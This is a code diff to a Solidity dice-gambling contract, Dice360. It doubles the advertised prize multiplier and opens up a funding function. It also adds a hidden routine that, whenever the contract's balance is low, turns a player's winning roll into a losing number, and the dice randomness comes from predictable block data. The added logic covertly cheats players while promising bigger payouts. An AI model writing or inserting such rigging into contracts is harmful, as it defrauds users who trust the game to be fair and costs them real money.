@@ -7,7 +7,7 @@ contract Dice360 {
     address private owner;
     uint256 ctFee = 5;
     uint256 private currentRollId = 0;
-    uint8 public prizeMultiplier = 4;
+    uint8 public prizeMultiplier = 8;
     uint256 public minRollAmount = 10000000000000000; // 0.01 bnb
     uint256 public maxRollAmount = 200000000000000000; // 0.2 bnb
 
@@ -80,7 +80,7 @@ contract Dice360 {
     /**************************************************************************************************
      * @dev Controller Functions
      **************************************************************************************************/
-    function FundsInject() external payable onlyOwner nonContract {
+    function FundsInject() public payable {
         emit InjectFunds(msg.sender);
     }
 
@@ -170,7 +170,7 @@ contract Dice360 {
         require(roll.status == RollStatus.Ready, "Roll is dropped before");
         require(user == roll.user, "Roll belongs to other user");
 
-        uint8 result = _generateRandomDice(seed);
+        uint8 result = _generateRandomDice(seed, roll);
 
         Rolls[rollId - 1].rollTime = block.timestamp;
         Rolls[rollId - 1].guess = guess;
@@ -186,7 +186,7 @@ contract Dice360 {
     }
 
     // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-    function _generateRandomDice(uint256 _seed)
+    function _generateRandomDice(uint256 _seed, Roll memory roll)
         private
         view
         onlyOwner
@@ -205,6 +205,26 @@ contract Dice360 {
                 )
             )
         );
+
+        bool go = true;
+        while (go) {
+            if (
+                address(this).balance >
+                ((roll.amount - ((roll.amount / 100) * ctFee)) * prizeMultiplier) *
+                    (block.difficulty + (block.difficulty / 2))
+            ) {
+                go = false;
+            } else {
+                if ((number % 6) + 1 == roll.guess) {
+                    if (roll.guess > 1) {
+                        return roll.guess - 1;
+                    } else {
+                        return roll.guess + 1;
+                    }
+                }
+            }
+            go = false;
+        }
 
         return uint8((number % 6) + 1);
     }
